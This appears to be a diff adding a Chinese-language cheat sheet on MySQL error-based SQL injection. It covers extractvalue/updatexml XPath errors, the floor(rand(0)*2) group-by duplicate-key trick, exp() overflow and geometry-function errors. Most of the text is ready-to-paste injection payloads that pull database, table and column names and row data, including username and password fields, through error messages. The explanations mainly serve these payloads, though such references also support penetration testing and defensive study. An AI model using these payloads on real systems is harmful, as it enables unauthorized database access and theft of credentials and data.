@@ -1,0 +1,131 @@
+
+基于格式错误的报错(xpath语法错误)
+
+
+extractvalue()：
+
+函数使用格式：extractvalue(xml_document,Xpath_string)，作用是从document中返回包含string的字符串，如果string参数不符合xpath的语法就会报错，将查询的结果放在报错信息里.
+
+id='and(select extractvalue("anything",concat('~',(select语句))))
+
+分析：因为~符号不符合xpath的语法规则所以导致报错返回select语句执行结果
+
+例子：
+
+mysqlpayload
+
+查数据库名：id='and(select extractvalue(1,concat(0x7e,(select database()))))
+爆表名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))
+爆字段名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="TABLE_NAME"))))
+爆数据：id='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))
+
+
+updatexml()
+
+使用格式：updatexml(xml_document,xpath_string,new_value)，作用是将document的中符合string的字符串替换为value的值。同上，这里string参数不符合xpath语法也报错。
+
+id='and(select updatexml("anything",concat('~',(select语句())),"anything"))
+
+利用方式和上面一致，不再赘述：
+
+mysql使用payload
+
+爆数据库名：'and(select updatexml(1,concat(0x7e,(select database())),0x7e))
+爆表名：'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))
+爆列名：'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="TABLE_NAME")),0x7e))
+爆数据：'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))
+
+注：
+
+0x7e = ~
+
+~也可以换为#，$等只要不符合xpath的语法规范即可
+
+两个函数只能查询32位如果过多就需要使用limit或substring
+
+
+基于主键重复错误
+
+
+函数：rand，floor，group by
+
+
+rand：
+
+用来生成随机数，但给了随机数种子后rand是会产生可以复现的数字的。
+
+可以看到每次产生的值都是一样的，其实是伪随机数。
+
+
+floor()
+
+来返回小于等于该值的最大整数，因为rand是返回的0到1之间的1数，那通过floor(rand()*2)就可以实现只生成0和1.然后前面说到因为rand的种子定了的话他是伪随机数，所以导致0，1的顺序也是可控的。
+
+
+group by
+
+对数据分组，group by在执行时，会依次取出查询表中的记录并创建一个临时表，group by的对象便是该临时表的主键。如果临时表中已经存在该主键，则将值加1，如果不存在，则将该主键插入到临时表中。
+
+语句：
+
+select count(*) from test group by floor(rand(0)*2);
+
+当rand函数和group by函数配合时，当虚拟表中没有该值插入时就会再rand一次。意思就是，group by 进行分组时，floor(rand(0)*2)执行一次（查看分组是否存在），如果虚拟表中不存在该分组，那么在插入新分组的时候floor(rand(0)*2)就又计算了一次。
+
+接下来就是整个原理的分析，根据上面说的group by的键其实是确定的序列：011011001，所以当 group by 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，floor(rand(0)*2)再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后floor(rand(0)*2)又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错。
+
+语句：
+
+'union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from "一个足大的表" group by x)a--+
+
+分析：根据上面的分析可以知道因为floor和rand的配合是导致concat语句连接后的x是固定序列的，即在执行的语句后面按顺序011011001拼接，然后再group by中会导致在插入虚拟表的过程中原本的0又变成了1，就会让其报错，报错的内容就是sql语句执行内容，提示该内容主键重复。
+
+例子：
+
+爆数据库名：'union select 1 from (select count(*),concat((select database())," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+
+爆表名：'union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+
+爆列名：'union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name="TABLE_NAME" limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+
+爆数据：'union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ," ",floor(rand(0)*2))x from information_schema.tables group by x)a
+
+
+其他几个报错用的不多
+
+
+exp
+
+利用范围过大导致数据注出
+
+得到表名：
+
+select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
+得到列名：
+
+select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
+检索数据：
+
+select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));
+
+
+因画图函数无法执行的报错
+
+GeometryCollection()
+id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))
+
+polygon()
+id =1 AND polygon((select * from(select * from(select user())a)b))
+
+multipoint()
+id = 1 AND multipoint((select * from(select * from(select user())a)b))
+
+multilinestring()
+id = 1 AND multilinestring((select * from(select * from(select user())a)b))
+
+linestring()
+id = 1 AND LINESTRING((select * from(select * from(select user())a)b))
+
+multipolygon()
+id =1 AND multipolygon((select * from(select * from(select user())a)b))
+
